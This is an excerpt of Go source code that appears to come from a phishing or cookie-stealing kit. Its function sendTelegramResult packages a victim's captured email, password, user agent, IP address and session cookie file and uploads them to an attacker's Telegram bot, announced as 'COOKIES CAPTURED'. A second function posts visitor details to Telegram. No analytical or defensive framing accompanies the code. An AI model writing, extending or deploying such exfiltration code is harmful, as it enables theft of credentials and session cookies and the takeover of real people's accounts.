...
func sendTelegramResult(cookies string, username string, password string, useragent string, remote_addr string) {
	...
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument?chat_id=%s", getUrl(), getChatId())
	msg := fmt.Sprintf("🍁 COOKIES CAPTURED 🍁\n\n******[💻 Valid Log💻]******\n🌟 Email = %s\n🔑 Password = %s\n🌎 UserAgent = %s\n🎌 IP = https://ip-api.com/%s\n\n⁎⁎⁎⁎⁎⁎ANONYMOUS⁎⁎⁎⁎⁎⁎⁎⁎", username, password, useragent, remote_addr)
	...
	if err != nil {
		fmt.Printf("Unable to create form file: %v", err)
		return
	}
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Printf("Unable to copy file contents: %v", err)
		return
	}
	...
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Telegram API returned non-OK status: %s", resp.Status)
		return
	}
...
func telegramSendVisitor(msg string) {
	...
	request, err := http.Post(url, "application/json", responseBody)
	if err != nil {
	...
	fmt.Println("Result sent to telegram:", string(body))
}
